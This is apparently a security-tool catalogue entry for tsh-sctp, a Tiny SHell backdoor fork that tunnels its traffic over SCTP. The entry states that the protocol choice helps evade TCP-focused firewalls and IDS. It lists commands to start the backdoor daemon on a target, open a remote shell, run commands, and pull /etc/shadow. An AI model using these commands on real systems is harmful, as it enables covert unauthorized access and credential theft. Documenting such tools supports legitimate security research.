---
name: "tsh-sctp"
categories:
  - blackarch-backdoor
version: "2.850a2da"
homepage: "https://github.com/infodox/tsh-sctp"
packaged-by: [blackarch]
blackarch-builddate: "2016-12-31"
build-system: scripts
license: GPL
meta-checked: "2026-11-09"
github-repo: "infodox/tsh-sctp"
github-stars: 125
github-pushed: "2013-10-19"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# tsh-sctp

> Tiny SHell reborn on SCTP — the classic tsh client/server backdoor with its transport swapped from TCP to SCTP.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Infodox's fork of Tiny SHell 0.6 (see [[tsh]]) that carries the same model — `tshd` server, `tsh` client, compiled-in secret key and port, full-pty shell, command execution, file transfer — over SCTP associations instead of TCP sessions. The appeal is blend-in traffic: SCTP is common in telecom and rarely matched by naive TCP-centric firewall and IDS rules, so the backdoor's chatter tends to fall outside what operators inspect. The author's own README warnings stand: only tested on Arch Linux, self-described as a fairly ugly hack with known compile errors, and the password is still stored in cleartext inside the binaries (with a hashed-password fix planned but never landed — last commit 2013). Treat it as an experimental, historical variant of tsh, not a maintained tool.

## Typical use cases

### Start the SCTP server on the target

```
umask 077; HOME=/var/tmp ./tshd
```

Outcome: `tshd` daemonizes and waits for the client's SCTP association on the port configured in `tsh.h`; the `umask`/`HOME` prefix keeps its scratch files private, exactly as with tsh.

### Open a shell over SCTP

```
./tsh target.example.com
```

Outcome: interactive full-pty shell on the remote host, tunneled through an SCTP association instead of a TCP connection; in connect-back builds, address the server as `cb` (`./tsh cb`).

### Pull a file over SCTP

```
./tsh target.example.com get /etc/shadow .
```

Outcome: transfers the remote file into the current directory over the SCTP channel; `put` uploads in the other direction, and one-shot execution works the same way as tsh (`./tsh target.example.com "uname -a"`).
